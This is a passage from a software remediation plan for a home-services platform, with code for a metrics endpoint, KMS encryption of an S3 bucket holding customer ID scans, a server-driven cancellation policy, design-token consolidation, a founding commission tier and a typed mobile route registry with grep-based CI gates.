**Step 4.** API code: add `/metrics` endpoint via `prom-client`:

```ts
// packages/api/src/server.ts
import promClient from 'prom-client';
const register = new promClient.Registry();
promClient.collectDefaultMetrics({ register });

// Custom counters
export const httpRequestsTotal = new promClient.Counter({
  name: 'http_requests_total',
  help: 'HTTP requests',
  labelNames: ['method', 'route', 'status'],
  registers: [register],
});

export const walletReconciliationDiscrepancies = new promClient.Counter({
  name: 'wallet_reconciliation_discrepancies_total',
  help: 'Reconciliation discrepancies detected',
  registers: [register],
});

app.get('/metrics', async (_req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});
```

### Verification (Ken click-through)

1. Run `docker-compose up` on staging.
2. Hit `http://staging-monitoring:9090/targets` — see all 6 targets in `UP` state within 30 seconds.
3. Hit `http://staging-monitoring:3000` (Grafana) — log in, dashboard "onService Overview" shows non-zero data.
4. Stop API container — `APIDown` alert fires within 2 minutes — Alertmanager receives.

---

## Bug 1325 — S3 SSE deferred (customer government IDs unencrypted at rest)

**File:** `docs/SECURITY-POSTURE.md:14`
**Severity:** HIGH — RA 10173 §20 violation risk; NPC penalties up to ₱5M per breach

### Current state

`SECURITY-POSTURE.md` line 14 reads `SEC-004 (S3 SSE) DEFERRED`. Customer NBI clearance scans, government IDs, signed IC agreements — all in S3 unencrypted at rest. Server-side AES-256 encryption is a one-line change.

### Exact fix

**Step 1.** Update bucket policy via Terraform (or AWS Console + IaC import):

```hcl
# infra/terraform/s3-customer-uploads.tf
resource "aws_s3_bucket" "customer_uploads" {
  bucket = "onservice-customer-uploads-${var.environment}"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "customer_uploads" {
  bucket = aws_s3_bucket.customer_uploads.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.customer_uploads.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_kms_key" "customer_uploads" {
  description             = "Encryption key for customer uploads (NBI, IDs, agreements)"
  deletion_window_in_days = 30
  enable_key_rotation     = true
}

# Block public access entirely
resource "aws_s3_bucket_public_access_block" "customer_uploads" {
  bucket                  = aws_s3_bucket.customer_uploads.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Force HTTPS-only
resource "aws_s3_bucket_policy" "customer_uploads_tls" {
  bucket = aws_s3_bucket.customer_uploads.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Sid       = "DenyUnencryptedTransport"
      Effect    = "Deny"
      Principal = "*"
      Action    = "s3:*"
      Resource  = ["${aws_s3_bucket.customer_uploads.arn}/*", aws_s3_bucket.customer_uploads.arn]
      Condition = { Bool = { "aws:SecureTransport" = "false" } }
    }]
  })
}
```

**Step 2.** Backfill existing objects. Create `packages/api/scripts/s3-backfill-encryption.ts`:

```ts
// Re-uploads all objects in the bucket through S3 with KMS encryption.
import { S3Client, ListObjectsV2Command, CopyObjectCommand } from '@aws-sdk/client-s3';

const BUCKET = process.env.S3_BUCKET!;
const KMS_KEY = process.env.S3_KMS_KEY_ID!;
const s3 = new S3Client({});

async function main() {
  let token: string | undefined;
  let count = 0;
  do {
    const list = await s3.send(new ListObjectsV2Command({ Bucket: BUCKET, ContinuationToken: token }));
    for (const obj of list.Contents ?? []) {
      await s3.send(new CopyObjectCommand({
        Bucket: BUCKET,
        Key: obj.Key!,
        CopySource: `${BUCKET}/${encodeURIComponent(obj.Key!)}`,
        ServerSideEncryption: 'aws:kms',
        SSEKMSKeyId: KMS_KEY,
        MetadataDirective: 'COPY',
      }));
      count++;
      if (count % 100 === 0) console.log(`Re-encrypted ${count} objects`);
    }
    token = list.NextContinuationToken;
  } while (token);
  console.log(`Done. Total: ${count}`);
}

main().catch(err => { console.error(err); process.exit(1); });
```

**Step 3.** Update upload code to specify SSE on every Put:

```ts
// packages/api/src/services/s3-upload.service.ts
await s3.send(new PutObjectCommand({
  Bucket: BUCKET,
  Key: key,
  Body: stream,
  ContentType: mimeType,
  ServerSideEncryption: 'aws:kms',
  SSEKMSKeyId: process.env.S3_KMS_KEY_ID,
}));
```

**Step 4.** Audit gate. Add CloudWatch alarm:
- Metric: `s3:PutObject` requests where `ServerSideEncryption !== 'aws:kms'`
- Threshold: any > 0 within 5 min → alarm

**Step 5.** Update `docs/SECURITY-POSTURE.md`:

```markdown
### SEC-004 — S3 server-side encryption (RESOLVED in Phase 14, Dispatch 01)
- All customer-upload bucket objects encrypted at rest with KMS.
- KMS key has annual rotation enabled.
- Bucket policy denies non-TLS access.
- Public access fully blocked.
- Backfill of pre-existing objects completed [date].
```

**Step 6.** Update `LAUNCH-LIMITATIONS.md` to remove S3 SSE from deferred list (if it appears there) and confirm in security section.

### Verification (Ken click-through)

1. AWS Console → S3 → bucket → Properties → Default encryption: SSE-KMS, key ARN visible.
2. Run a test upload (provider NBI from staging app), then download via AWS CLI: `aws s3api head-object --bucket onservice-customer-uploads-staging --key path/to/file` — expect `"ServerSideEncryption": "aws:kms"`.
3. Run `aws s3api list-objects-v2 ... | jq '.Contents[].Key'` then for each: confirm encryption metadata. The backfill script's exit log shows `Done. Total: <N>`.
4. Try downloading an object via HTTP (not HTTPS) → bucket policy denies.

---

## Dispatch 01 closeout

**Gate runs (all must pass):**
- Gate B (no fake-green): each bug above has a real fix with a verifiable test, not a comment-out or skip.
- Gate C (constitution): no axios anywhere (Bug 1271 chain partially addressed), no console.log in modified files, no emoji, no `localStorage.setItem('admin_*')` anywhere.
- Gate E (mutation): mutation-test the 4 new files (`secure-storage.ts`, `bootstrap-admin.ts`, admin api.ts, prometheus rules) — kill rate must be ≥99%.

**Files added (10):**
- `apps/mobile/src/services/secure-storage.ts`
- `apps/mobile/src/services/auth-migration.ts`
- `apps/mobile/src/services/__tests__/secure-storage.test.ts`
- `packages/api/scripts/bootstrap-admin.ts`
- `packages/api/__tests__/scripts/bootstrap-admin.test.ts`
- `packages/api/migrations/070_admin_csrf_tokens.sql`
- `packages/api/__tests__/admin-auth-cookies.test.ts`
- `infra/terraform/s3-customer-uploads.tf`
- `monitoring/rules/onservice.yml`
- `scripts/gates/c-constitution-no-admin-password-seeds.sh`

**Files modified (8):**
- `apps/mobile/src/services/api.ts`
- `apps/mobile/src/store/auth.store.ts`
- `apps/mobile/app/_layout.tsx`
- `apps/mobile/app.config.ts` (rename from app.json)
- `apps/admin/src/lib/api.ts`
- `apps/admin/src/App.tsx`
- `monitoring/prometheus.yml`
- `docker-compose.yml`

**Files deleted (1):**
- `packages/api/seeds/004_admin_passwords.sql`

**Documentation updates:**
- `LAUNCH-LIMITATIONS.md` §21 added (admin password bootstrap)
- `docs/SECURITY-POSTURE.md` SEC-004 marked RESOLVED
- `packages/api/seeds/README.md` created

**What dispatches 02–14 now have available:**
- `secureStorage` abstraction for any future sensitive client-side storage
- `requireAdminCsrf` middleware for admin write endpoints
- httpOnly cookie auth pattern (admin)
- Working `/metrics` endpoint with custom counters
- KMS-encrypted S3 for any future user uploads

---

# DISPATCH 02 — Cross-source-of-truth reconciliation

## Goal

The audit found the platform has the same data defined in multiple, drifted places. The four worst examples:

1. **Cancellation policy** — 4 different values across `platform.config.ts`, `terms.tsx`, `help.tsx`, migration 050 + tests (Bug 1170/1198).
2. **Brand primary color** — 3 different hex values across `tokens.json`, `DESIGN-CONTRACT.md`, `theme.ts` (Bug 1324).
3. **Founding tier** — committed to in `STRATEGIC-DECISIONS-LOG.md` DECISION-003 but **NOT in code** (Bug 1323).
4. **Routes registry** — `apps/mobile/src/config/navigation.ts` declares ~30 routes but ~70% of mobile screens use raw string paths (Bug 1185).

Plus 19 smaller drift bugs in the same family.

**Why this is dispatch 02:** all customer-facing screens depend on these being reconciled. Phase 14 catalog parts 2A/2B/2C reference single sources of truth that don't yet exist in the code. Until Dispatch 02 lands, the AI coder building screens is forced to either pick one source (drift continues) or wait.

**Branch:** `phase/14-d02-source-of-truth`
**Tag at end:** `v0.14.0-d02-complete`
**Gates that must pass:** A (cross-source) — must pass green; B/C/D/E — must pass.

---

## Bug 1170 + 1198 — Cancellation policy in 4 places

### The drift

| Source | Values | Notes |
|---|---|---|
| `packages/api/src/config/platform.config.ts:28-33` | beforeMatch=0, afterMatch=5%, afterPayment=10%, afterEnRoute=25%, noShow=100% | 5-tier, used by server pricing engine |
| `apps/mobile/app/customer/terms.tsx` | 24h+/12-24h/2-12h/under-2h/post-arrival = 100/90/75/50/0 | 5-tier, **flipped meaning** (refund %, not fee %), different thresholds |
| `apps/mobile/app/customer/help.tsx` | 20% / 50% | 2-tier oversimplification |
| `migrations/050_*` + `dispute-refund-processing.test.ts` | 7-tier policy with hour thresholds 48/24/12/6/2/0/post-arrival | This is the most thorough version, used by tests |

Cancellation policy is currently UNKNOWABLE — server uses one set, customer reads another, support help center quotes a third, and tests assume a fourth.

### Root cause

No CMS-driven source of truth for policy text. Every surface independently hardcoded. When a value changed once, the others didn't.

### The fix — one server source, all clients consume

**Step 1.** Create a CMS table for runtime policy:

```sql
-- packages/api/migrations/071_cancellation_policy.sql
CREATE TABLE cancellation_policies (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  version INTEGER NOT NULL,
  effective_from TIMESTAMPTZ NOT NULL,
  effective_to TIMESTAMPTZ,
  tiers JSONB NOT NULL,
  -- tiers: [
  --   { min_hours_before: 48, max_hours_before: null, refund_percent: 100, fee_percent: 0, label: '48+ hours before' },
  --   { min_hours_before: 24, max_hours_before: 48, refund_percent: 100, fee_percent: 0, label: '24-48 hours before' },
  --   { min_hours_before: 12, max_hours_before: 24, refund_percent: 90, fee_percent: 10, label: '12-24 hours before' },
  --   { min_hours_before: 6, max_hours_before: 12, refund_percent: 75, fee_percent: 25, label: '6-12 hours before' },
  --   { min_hours_before: 2, max_hours_before: 6, refund_percent: 50, fee_percent: 50, label: '2-6 hours before' },
  --   { min_hours_before: 0, max_hours_before: 2, refund_percent: 25, fee_percent: 75, label: 'under 2 hours' },
  --   { min_hours_before: -999, max_hours_before: 0, refund_percent: 0, fee_percent: 100, label: 'after scheduled time / no-show' }
  -- ]
  intro_text TEXT NOT NULL,
  legal_disclaimer TEXT NOT NULL,
  created_by UUID REFERENCES admin_users(id),
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  CHECK (jsonb_typeof(tiers) = 'array')
);

CREATE UNIQUE INDEX idx_cancellation_policies_version ON cancellation_policies(version);
CREATE INDEX idx_cancellation_policies_effective ON cancellation_policies(effective_from, effective_to);

-- Seed the canonical 7-tier policy as version 1
INSERT INTO cancellation_policies (version, effective_from, tiers, intro_text, legal_disclaimer)
VALUES (
  1,
  NOW(),
  '[
    { "min_hours_before": 48, "max_hours_before": null, "refund_percent": 100, "fee_percent": 0, "label": "48+ hours before" },
    { "min_hours_before": 24, "max_hours_before": 48, "refund_percent": 100, "fee_percent": 0, "label": "24-48 hours before" },
    { "min_hours_before": 12, "max_hours_before": 24, "refund_percent": 90, "fee_percent": 10, "label": "12-24 hours before" },
    { "min_hours_before": 6, "max_hours_before": 12, "refund_percent": 75, "fee_percent": 25, "label": "6-12 hours before" },
    { "min_hours_before": 2, "max_hours_before": 6, "refund_percent": 50, "fee_percent": 50, "label": "2-6 hours before" },
    { "min_hours_before": 0, "max_hours_before": 2, "refund_percent": 25, "fee_percent": 75, "label": "under 2 hours" },
    { "min_hours_before": -999, "max_hours_before": 0, "refund_percent": 0, "fee_percent": 100, "label": "after scheduled time / no-show" }
  ]'::jsonb,
  'Cancel anytime. Refunds depend on how close to your booking you cancel.',
  'Refund processed to original payment method within 5-10 business days. Service fees and taxes are non-refundable except for full-refund tiers.'
);
```

**Step 2.** Server endpoint `GET /api/v1/settings/cancellation-policy`:

```ts
// packages/api/src/routes/public/settings.ts
router.get('/cancellation-policy', async (_req, res) => {
  const policy = await db
    .selectFrom('cancellation_policies')
    .selectAll()
    .where('effective_from', '<=', new Date())
    .where((eb) => eb.or([
      eb('effective_to', 'is', null),
      eb('effective_to', '>=', new Date()),
    ]))
    .orderBy('effective_from', 'desc')
    .limit(1)
    .executeTakeFirstOrThrow();

  res.json({
    data: {
      version: policy.version,
      effective_from: policy.effective_from,
      tiers: policy.tiers,
      intro_text: policy.intro_text,
      legal_disclaimer: policy.legal_disclaimer,
    },
  });
});
```

Cache aggressively — Redis TTL 5 minutes. Invalidate on policy version bump.

**Step 3.** Replace `platform.config.ts` static cancellation values with a runtime read:

```ts
// packages/api/src/services/pricing/cancellation.service.ts
import { db } from '../../db';

export interface CancellationCalculation {
  policy_version: number;
  tier_label: string;
  refund_amount_cents: number;
  fee_amount_cents: number;
  total_charged_cents: number;
}

export async function calculateCancellation(
  bookingId: string,
  cancelTime: Date = new Date()
): Promise<CancellationCalculation> {
  const booking = await db
    .selectFrom('bookings')
    .select(['id', 'scheduled_at', 'total_amount_cents', 'service_fee_cents'])
    .where('id', '=', bookingId)
    .executeTakeFirstOrThrow();

  const policy = await db
    .selectFrom('cancellation_policies')
    .selectAll()
    .where('effective_from', '<=', cancelTime)
    .where((eb) => eb.or([
      eb('effective_to', 'is', null),
      eb('effective_to', '>=', cancelTime),
    ]))
    .orderBy('effective_from', 'desc')
    .limit(1)
    .executeTakeFirstOrThrow();

  const hoursBefore = (booking.scheduled_at.getTime() - cancelTime.getTime()) / 3_600_000;
  const tiers = policy.tiers as Array<{ min_hours_before: number; max_hours_before: number | null; refund_percent: number; fee_percent: number; label: string; }>;

  const tier = tiers.find(t =>
    hoursBefore >= t.min_hours_before &&
    (t.max_hours_before === null || hoursBefore < t.max_hours_before)
  );
  if (!tier) {
    throw new Error(`No cancellation tier matched hoursBefore=${hoursBefore}`);
  }

  const refundCents = Math.floor(booking.total_amount_cents * tier.refund_percent / 100);
  const feeCents = booking.total_amount_cents - refundCents;

  return {
    policy_version: policy.version,
    tier_label: tier.label,
    refund_amount_cents: refundCents,
    fee_amount_cents: feeCents,
    total_charged_cents: booking.total_amount_cents,
  };
}
```

**Step 4.** Wire all server cancellation paths to use this service:
- `bookings.service.ts` cancelBooking method — uses `calculateCancellation`
- `dispatch.service.ts` adminCancel — uses `calculateCancellation`
- `change-orders.service.ts` cancellation — same
- `recurring.service.ts` cancellation — same
- Add a single `/booking/:id/cancel-preview` endpoint that returns the calculation result for client display before confirming.

**Step 5.** Mobile client: replace ALL hardcoded cancellation policy text with consumption from server.

`apps/mobile/app/customer/terms.tsx` — replace the hardcoded 5-tier table with `<CancellationPolicyTable />`:

```tsx
// apps/mobile/src/components/CancellationPolicyTable.tsx
import { useQuery } from '@tanstack/react-query';
import { api } from '@/services/api';
import { Text, View } from 'react-native';

export function CancellationPolicyTable() {
  const { data, isLoading, error } = useQuery({
    queryKey: ['cancellation-policy'],
    queryFn: () => api.get<{ data: CancellationPolicy }>('/api/v1/settings/cancellation-policy'),
    staleTime: 5 * 60_000,
  });

  if (isLoading) return <SkeletonTable rows={7} />;
  if (error || !data) return <RetryBanner onRetry={refetch} />;

  return (
    <View>
      <Text style={styles.intro}>{data.data.intro_text}</Text>
      {data.data.tiers.map((tier, i) => (
        <View key={i} style={styles.row}>
          <Text style={styles.label}>{tier.label}</Text>
          <Text style={styles.refund}>{tier.refund_percent}% refund</Text>
          <Text style={styles.fee}>{tier.fee_percent}% fee</Text>
        </View>
      ))}
      <Text style={styles.disclaimer}>{data.data.legal_disclaimer}</Text>
    </View>
  );
}
```

**Step 6.** Same component used in:
- `apps/mobile/app/customer/help.tsx` — replace hardcoded "20% / 50%" section with `<CancellationPolicyTable />`
- `apps/mobile/app/customer/booking/confirm.tsx` — show policy summary
- `apps/mobile/app/customer/booking/[id].tsx` — show "If you cancel now, you'd receive ₱X" using `/booking/:id/cancel-preview` endpoint

**Step 7.** Admin: SystemSettingsPage cancellation section becomes editor for `cancellation_policies` table. Each save creates a new version row, doesn't UPDATE existing (audit-preserving).

**Step 8.** Cross-source gate (Gate A):

```bash
# scripts/gates/a-cross-source-cancellation-policy.sh
#!/usr/bin/env bash
set -euo pipefail

# Check: no hardcoded cancellation percent strings in mobile code
violations=$(grep -rE '(beforeMatch|afterMatch|afterPayment|afterEnRoute|24h|48h).*[0-9]+%|refund_percent.*=.*[0-9]+' \
  apps/mobile/app/ apps/mobile/src/ 2>/dev/null | \
  grep -v ".test." | grep -v "CancellationPolicyTable" | grep -v "//.*comment" || true)

if [ -n "$violations" ]; then
  echo "GATE A VIOLATION (Bug 1170): hardcoded cancellation percentages outside CancellationPolicyTable"
  echo "$violations"
  exit 1
fi
echo "Gate A — cancellation policy single source: OK"
```

### Verification (Ken click-through)

1. Open admin SystemSettingsPage → Cancellation policy section.
2. Edit one tier (e.g., change 12-24h refund from 90% to 85%) — save.
3. Open mobile customer app → Profile → Terms & Privacy → Cancellation policy tab. **Within 5 minutes**: tier shows 85% (cache TTL).
4. Open Help → Cancellation policy section: also shows 85%.
5. Start a booking, get to Confirm screen: policy summary shows 85% in 12-24h tier.
6. After booking, on booking detail: tap "If I cancel now" — server-computed refund matches 85% × total.
7. Run gate A script — passes.
8. Verify migration 071 ran and `cancellation_policies` table has at least one row with version=1.

---

## Bug 1324 — Brand primary color in 3 places

### The drift

| File | Value | Notes |
|---|---|---|
| `apps/mobile/design-tokens/tokens.json` | `#1B3A4B` | "deep teal" — design system declares this canonical |
| `docs/DESIGN-CONTRACT.md` (old version) | `#0F62FE` | IBM-style blue — older draft never updated |
| `apps/mobile/src/theme/theme.ts` | `#0066FF` | "vivid blue" — implementation diverged |

Mobile app currently shows `#0066FF` everywhere. Admin uses `#0F62FE` from the old contract. tokens.json is dead documentation.

### The fix

DESIGN-CONTRACT-V2.md (already published in Phase 14 Part 1) locked `#1B3A4B` as the canonical brand primary. Now make code obey.

**Step 1.** Single source of truth: `design-tokens/tokens.json` becomes a CSS-variable + JS-export bundle generated by Style Dictionary.

```bash
# Install build chain
pnpm add -DW style-dictionary
```

`design-tokens/style-dictionary.config.cjs`:

```js
module.exports = {
  source: ['design-tokens/tokens.json'],
  platforms: {
    'web-css': {
      transformGroup: 'css',
      buildPath: 'design-tokens/build/web/',
      files: [{ destination: 'tokens.css', format: 'css/variables' }],
    },
    'web-ts': {
      transformGroup: 'js',
      buildPath: 'design-tokens/build/web/',
      files: [{ destination: 'tokens.ts', format: 'javascript/es6' }],
    },
    'mobile-ts': {
      transformGroup: 'react-native',
      buildPath: 'design-tokens/build/mobile/',
      files: [{ destination: 'tokens.ts', format: 'javascript/es6' }],
    },
  },
};
```

`design-tokens/tokens.json` becomes the single source. Build outputs consumed by web (admin) and mobile.

**Step 2.** Mobile theme.ts becomes a thin re-export:

```ts
// apps/mobile/src/theme/theme.ts
export { tokens } from '../../../design-tokens/build/mobile/tokens';
export const colors = tokens.color;
export const spacing = tokens.spacing;
export const radii = tokens.radius;
export const typography = tokens.typography;
```

Replace every direct hex usage with `colors.brand.primary` (now `#1B3A4B`).

**Step 3.** Admin: `apps/admin/src/index.css` imports `design-tokens/build/web/tokens.css`. All `#0F62FE` literals across admin code replaced with `var(--color-brand-primary)`.

**Step 4.** Old `DESIGN-CONTRACT.md` deleted; replaced by `DESIGN-CONTRACT-V2.md` (already published).

**Step 5.** Cross-source gate:

```bash
# scripts/gates/a-cross-source-brand-color.sh
#!/usr/bin/env bash
set -euo pipefail

# No raw hex usage of old brand colors anywhere
old_colors=("#0066FF" "#0F62FE" "0066ff" "0f62fe")
for color in "${old_colors[@]}"; do
  hits=$(grep -rE "$color" apps/ packages/ --include="*.ts" --include="*.tsx" --include="*.css" 2>/dev/null | grep -v "design-tokens/" || true)
  if [ -n "$hits" ]; then
    echo "GATE A VIOLATION (Bug 1324): old brand color $color found"
    echo "$hits"
    exit 1
  fi
done
echo "Gate A — brand color single source: OK"
```

### Verification

- Run gate — passes.
- Inspect mobile customer home screen — brand primary visibly `#1B3A4B` (deep teal), not blue.
- Admin sidebar active accent — same teal.

---

## Bug 1323 — Founding tier (10% commission) committed to but not in code

### The state

`docs/STRATEGIC-DECISIONS-LOG.md` DECISION-003 explicitly committed founding tier at 10% commission for early Boracay providers. Ken's V14 audit notation: "⬜ NOT YET in code." The tier is not in `commission_rates` table, not in tier-progression, not in admin UI.

### The fix

**Step 1.** Migration:

```sql
-- packages/api/migrations/072_founding_tier.sql
INSERT INTO commission_rates (tier_name, commission_percent, effective_from)
VALUES ('founding', 10.00, NOW());

-- Add column to provider_profile to mark assignment
ALTER TABLE provider_profile
ADD COLUMN founding_tier_assigned_at TIMESTAMPTZ,
ADD COLUMN founding_tier_assigned_by UUID REFERENCES admin_users(id),
ADD COLUMN founding_tier_notes TEXT;

CREATE INDEX idx_provider_profile_founding ON provider_profile(founding_tier_assigned_at) WHERE founding_tier_assigned_at IS NOT NULL;
```

**Step 2.** Tier resolution service must check founding override first:

```ts
// packages/api/src/services/provider/tier.service.ts
export async function resolveProviderCommissionRate(providerId: string): Promise<number> {
  const provider = await db
    .selectFrom('provider_profile')
    .select(['tier', 'founding_tier_assigned_at'])
    .where('user_id', '=', providerId)
    .executeTakeFirstOrThrow();

  const tierName = provider.founding_tier_assigned_at ? 'founding' : provider.tier;

  const rate = await db
    .selectFrom('commission_rates')
    .select('commission_percent')
    .where('tier_name', '=', tierName)
    .where('effective_from', '<=', new Date())
    .orderBy('effective_from', 'desc')
    .limit(1)
    .executeTakeFirstOrThrow();

  return rate.commission_percent;
}
```

**Step 3.** Admin UI: ProviderDetailPage Profile tab gets a "Founding tier" toggle (super_admin only, per Part 2A spec):

```tsx
// apps/admin/src/pages/ProviderDetailPage.tsx — section
{currentUser.role === 'super_admin' && (
  <SettingRow
    label="Founding tier"
    description="10% commission, applies regardless of standard tier progression"
  >
    <Toggle
      checked={!!provider.founding_tier_assigned_at}
      onChange={async (checked) => {
        if (checked) {
          const note = await prompt({ title: 'Why are you assigning founding tier?', minLength: 20 });
          if (note) await api.post(`/admin/providers/${id}/assign-founding-tier`, { note });
        } else {
          const note = await prompt({ title: 'Why are you removing founding tier?', minLength: 20 });
          if (note) await api.post(`/admin/providers/${id}/remove-founding-tier`, { note });
        }
        refetch();
      }}
    />
  </SettingRow>
)}
```

**Step 4.** Server endpoints assign/remove with audit:

```ts
router.post('/admin/providers/:id/assign-founding-tier', requireSuperAdmin, requireAdminCsrf, async (req, res) => {
  const { note } = z.object({ note: z.string().min(20) }).parse(req.body);
  await db.transaction().execute(async (trx) => {
    await trx.updateTable('provider_profile')
      .set({
        founding_tier_assigned_at: new Date(),
        founding_tier_assigned_by: req.adminUser!.id,
        founding_tier_notes: note,
      })
      .where('user_id', '=', req.params.id)
      .execute();
    await trx.insertInto('admin_actions').values({
      actor_id: req.adminUser!.id,
      action_type: 'founding_tier_assigned',
      target_type: 'provider',
      target_id: req.params.id,
      reason: note.slice(0, 500),
      full_notes: note,
      details: {},
    }).execute();
  });
  res.json({ data: { ok: true } });
});
```

**Step 5.** Provider mobile tier-progression screen shows founding when assigned (Part 2C section 34 acceptance).

**Step 6.** Update `docs/STRATEGIC-DECISIONS-LOG.md` DECISION-003 to mark "✅ implemented in Phase 14 Dispatch 02".

### Verification

- Migration 072 runs.
- Admin: super_admin assigns founding tier to a test provider. `admin_actions` row created.
- Booking that provider for ₱500: commission computed as `500 × 10% = 50` not the tier-progression rate.
- Provider sees founding tier on `/provider/tier-progression` screen.

---

## Bug 1185 — Routes registry (~70% drift)

### The state

`apps/mobile/src/config/navigation.ts` declares a routes registry. Most code uses raw strings:

```ts
router.push('/(tabs)/profile');  // 50+ places like this
```

The registry is dead documentation.

### The fix

**Step 1.** Make `Routes` a typed const that maps every path used in the app:

```ts
// apps/mobile/src/config/navigation.ts (rewritten)

export const Routes = {
  ROOT: '/',
  ONBOARDING: '/onboarding',

  AUTH: {
    LOGIN: '/auth/login',
    OTP_VERIFY: '/auth/otp-verify',
    REGISTER: '/auth/register',
  },

  CUSTOMER: {
    HOME: '/(tabs)/home',
    BOOKINGS: '/(tabs)/bookings',
    WALLET: '/(tabs)/wallet',
    PROFILE: '/(tabs)/profile',
    SEARCH: '/customer/search',
    CATEGORY: (id: string) => `/customer/category/${id}`,
    BOOKING: {
      CONFIGURE: '/customer/booking/configure',
      FORM: '/customer/booking/form',
      JOB_REQUEST: '/customer/booking/job-request',
      QUOTES: '/customer/booking/quotes',
      CONFIRM: '/customer/booking/confirm',
      CHECKOUT: '/customer/booking/checkout',
      DETAIL: (id: string) => `/customer/booking/${id}`,
      TRACKER: '/customer/booking/tracker',
      PHOTOS: '/customer/booking/photos',
      COMPLETE: '/customer/booking/complete',
      REVIEW: '/customer/booking/review',
      TIP: '/customer/booking/tip',
      DISPUTE: '/customer/booking/dispute',
      CHANGE_ORDER: '/customer/booking/change-order',
      MAKE_RECURRING: '/customer/booking/make-recurring',
      PAYMENT_FAILED: '/customer/booking/payment-failed',
    },
    RECURRING: {
      LIST: '/customer/recurring',
      DETAIL: (id: string) => `/customer/recurring/${id}`,
    },
    CHAT: (id: string) => `/customer/chat/${id}`,
    PROVIDER_PROFILE: (id: string) => `/customer/provider/${id}`,
    ADDRESSES: '/customer/addresses',
    ADDRESS_PICKER: '/customer/address-picker',
    PAYMENT_METHODS: '/customer/payment-methods',
    WALLET_TOPUP: '/customer/wallet-topup',
    NOTIFICATIONS: '/customer/notifications',
    NOTIFICATION_SETTINGS: '/customer/notification-settings',
    HELP: '/customer/help',
    TERMS: '/customer/terms',
    SAFETY: '/customer/safety',
    DATA_RIGHTS: '/customer/data-rights',
    SUKI_PROS: '/customer/suki-pros',
    REFERRAL: '/customer/referral',
    ACCOUNT_MANAGEMENT: '/customer/account-management',
  },

  PROVIDER: {
    ONBOARDING: {
      ROLE_SELECT: '/provider-onboarding/role-select',
      TERMS: '/provider-onboarding/terms',
      CATEGORIES: '/provider-onboarding/categories',
      SERVICE_AREA: '/provider-onboarding/service-area',
      DOCUMENTS: '/provider-onboarding/documents',
      SELFIE: '/provider-onboarding/selfie',
      IDENTITY_VERIFICATION: '/provider-onboarding/identity-verification',
      BACKGROUND_CHECK: '/provider-onboarding/background-check-status',
      REVIEW_PENDING: '/provider-onboarding/review-pending',
    },
    DASHBOARD: '/(provider-tabs)/dashboard',
    JOBS: '/(provider-tabs)/jobs',
    EARNINGS: '/(provider-tabs)/earnings',
    PROFILE_TAB: '/(provider-tabs)/provider-profile',
    JOB: {
      DETAIL: (id: string) => `/provider/job/${id}`,
      CHECKLIST: (id: string) => `/provider/job/${id}/checklist`,
      QUOTE: (id: string) => `/provider/job/${id}/quote`,
      PHOTOS: (id: string) => `/provider/job/${id}/photos`,
      COMPLETE: (id: string) => `/provider/job/${id}/complete`,
      NAVIGATE: (id: string) => `/provider/job/${id}/navigate`,
      CHANGE_ORDER: (id: string) => `/provider/job/${id}/change-order`,
    },
    SCHEDULE: '/provider/schedule',
    AVAILABILITY: '/provider/availability',
    CALENDAR: '/provider/calendar',
    SERVICES: '/provider/services',
    SKILLS: '/provider/skills',
    CERTIFICATIONS: '/provider/certifications',
    PORTFOLIO: '/provider/portfolio',
    PAYOUTS: '/provider/payouts',
    WITHDRAW: '/provider/withdraw',
    PAYOUT_SETTINGS: '/provider/payout-settings',
    SUKI_CUSTOMERS: '/provider/suki-customers',
    TIER_PROGRESSION: '/provider/tier-progression',
    REVIEWS: '/provider/reviews',
    SERVICE_AREA: '/provider/service-area',
    NOTIFICATIONS: '/provider/notifications',
    HELP: '/provider/help',
    SETTINGS: '/provider/settings',
    ACCOUNT_MANAGEMENT: '/provider/account-management',
    CHAT: (id: string) => `/provider/chat/${id}`,
  },
} as const;

// Type helper: extract every path string from Routes
type ExtractPaths<T> = T extends string
  ? T
  : T extends (...args: any[]) => string
    ? ReturnType<T>
    : T extends Record<string, any>
      ? { [K in keyof T]: ExtractPaths<T[K]> }[keyof T]
      : never;

export type AnyRoute = ExtractPaths<typeof Routes>;
```

**Step 2.** Codemod every raw string path in mobile to use Routes constants. Sample replacement:

```diff
- router.push('/(tabs)/profile');
+ router.push(Routes.CUSTOMER.PROFILE);

- router.push(`/customer/booking/${booking.id}`);
+ router.push(Routes.CUSTOMER.BOOKING.DETAIL(booking.id));
```

Use `jscodeshift` for the bulk transform:

```js
// scripts/codemods/routes-to-registry.js
const ROUTE_MAP = {
  '/(tabs)/home': 'Routes.CUSTOMER.HOME',
  '/(tabs)/bookings': 'Routes.CUSTOMER.BOOKINGS',
  // ...
};

module.exports = function transformer(file, api) {
  const j = api.jscodeshift;
  const root = j(file.source);
  for (const [path, routeRef] of Object.entries(ROUTE_MAP)) {
    root.find(j.Literal, { value: path }).forEach(p => {
      p.replace(j.identifier(routeRef));
    });
  }
  // (Plus dynamic-path templates like `/customer/booking/${id}` → Routes.CUSTOMER.BOOKING.DETAIL(id))
  return root.toSource();
};
```

Run: `npx jscodeshift -t scripts/codemods/routes-to-registry.js apps/mobile/app apps/mobile/src`.

**Step 3.** Add gate that disallows raw path strings in router.push / router.replace calls:

```bash
# scripts/gates/a-cross-source-routes.sh
#!/usr/bin/env bash
set -euo pipefail

violations=$(grep -rE "router\.(push|replace)\(['\"]\/" apps/mobile/app/ apps/mobile/src/ 2>/dev/null | grep -v ".test." || true)
if [ -n "$violations" ]; then
  echo "GATE A VIOLATION (Bug 1185): raw path strings in router.push/replace; use Routes registry"
  echo "$violations"
  exit 1
fi
echo "Gate A — routes registry: OK"
```

### Verification

- Gate passes — no raw paths in `router.push` / `router.replace`.
- All mobile screens still navigate correctly (Maestro flow runs through every screen).
- Renaming a route requires changing exactly ONE place (Routes.X) — verified by manually changing `Routes.CUSTOMER.HOME` and observing TypeScript errors at every consumer.

---

## Other 19 cross-source bugs (abbreviated)

